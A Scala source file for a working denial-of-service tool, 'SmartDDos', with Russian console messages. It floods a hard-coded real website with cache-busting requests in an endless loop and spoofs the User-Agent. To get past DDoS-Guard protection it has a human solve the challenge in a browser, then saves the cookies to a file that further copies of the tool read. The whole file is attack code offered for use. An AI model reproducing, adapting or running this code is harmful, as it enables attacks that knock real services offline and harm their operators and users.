package hi

import akka.actor.ActorSystem
import akka.http.scaladsl.Http
import akka.http.scaladsl.model.{HttpRequest, HttpResponse, StatusCodes, headers}
import com.github.tototoshi.csv._
import hi.Agents.getCustomClientAgent
import hi.Test.randomQueryParam
import org.openqa.selenium.chrome.ChromeDriver
import io.github.bonigarcia.wdm.WebDriverManager
import java.io.{File, FileWriter}
import scala.collection.mutable
import scala.concurrent.{ExecutionContextExecutor, Future}

object SmartDDos {

  var agent: String = getCustomClientAgent

  var cookieMap = scala.collection.mutable.HashMap.empty[String, String]
  cookieMap += ("" -> "")

  def innerRequest(url: String, recursion: Boolean, file: String)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
    val str = randomQueryParam(url)

    Http().singleRequest(HttpRequest(uri = str).withHeaders(
      headers.RawHeader("Cache-Control", "no-cache"),
      headers.Cookie(cookieMap.map(i => (i._1, i._2)).toSeq:_*),
      headers.RawHeader("User-Agent", agent)
    )).flatMap {
      case HttpResponse(StatusCodes.OK, _, _, _) =>
        Future.successful {
          if (!recursion) {
            println(s"Аттака $str - ОК")
          } else {
            println(s"Аттака после редиректа $str")
          }
        }
      case HttpResponse(StatusCodes.Redirection(_), headers, _, _) =>
        Future.successful {
          if (recursion) {
            println(s"too many redirects $url")
          } else {
            val link = headers.filter(ss => ss.name().equals("Location"))

            if (link.nonEmpty && link.head.value().startsWith("http") && link.head.value() != str)
              innerRequest(link.head.value(), recursion = true, file)
            else {
              println(s"error redirect $url")
            }
          }
        }

      case HttpResponse(StatusCodes.Forbidden, headers, _, _) =>
        Future.successful{
          println(s"Доступ запрещен - 403 для цели $url")
          println(s"Запрос новых куков...")

          if(headers.exists(p => p.name() == "Server" && p.value() == "ddos-guard")) {
            fetchCookies(url, cookieMap, file)

            innerRequest(url, recursion = true, file)
          }
        }
      case err =>
        sys.error(s"server is not responding: $err")
    }
  }

  def fetchCookies(url: String, cookieMap: mutable.HashMap[String, String], filePath: String, isMaster: Boolean = true) = {

    if(isMaster) {
      WebDriverManager.chromedriver().setup()

      implicit val webDriver: ChromeDriver = {
        System.setProperty("webdriver.chrome.silentOutput", "true")
        new ChromeDriver()
      }

      webDriver.get(url)

      //ждать 20 с пока пользователь пройдет ручную проверку
      Thread.sleep(20000)

      webDriver.manage().getCookies.forEach {
        c =>
          cookieMap += (c.getName -> c.getValue)
      }

      saveCookie(cookieMap, filePath)
    } else {
      readCookie(cookieMap, filePath)
    }
  }

  val target = "https://xaknet.team/"

  object quoteAllFormat extends DefaultCSVFormat {
    override val quoting: Quoting = QUOTE_ALL
  }

  def saveCookie(cookie: mutable.HashMap[String, String], file: String) ={
    val writer = CSVWriter.open(new FileWriter(file))(quoteAllFormat)
    writer.writeAll(cookie.map(i => Seq(i._1, i._2)).toSeq)
    writer.close()
  }

  def readCookie(cookie: mutable.HashMap[String, String], filePath: String) = {
    val reader = CSVReader.open(new File(filePath))(quoteAllFormat)
    val data: List[List[String]] = reader.all()
    reader.close()

    data.foreach{
      c =>
        cookie += (c.head -> c(1))
    }
  }

  def main(args: Array[String]): Unit = {
    if(!System.getProperties.containsKey("master") && !System.getProperties.containsKey("file")) {
      println("Используйте -Dmaster=true для запуска первой копии и ручной авторизации")
      println("Используйте -Dmaster=false для запуска следующих копий, которые будут считывать куки из файла")
      println("Используйте -Dfile=cookie.csv путь к файлу с куками")
      println("java -Dmaster=false -Dfile=/cookie.csv -jar SmartDDosXaknet.jar")
      System.exit(0)
    }

    val isMaster: Boolean = System.getProperty("master").toBoolean
    val file: String = System.getProperty("file")

    val fileParam = new File(file)
    if(!fileParam.exists() && !fileParam.isFile) {
      println(s"-Dfile=$file не существует")
      System.exit(0)
    }

    implicit val system: ActorSystem = ActorSystem()
    implicit val executionContext: ExecutionContextExecutor = system.dispatcher

    fetchCookies(target, cookieMap, file, isMaster)

    while (true) {
      innerRequest(target, false, file)
      Thread.sleep(50)
    }
  }
}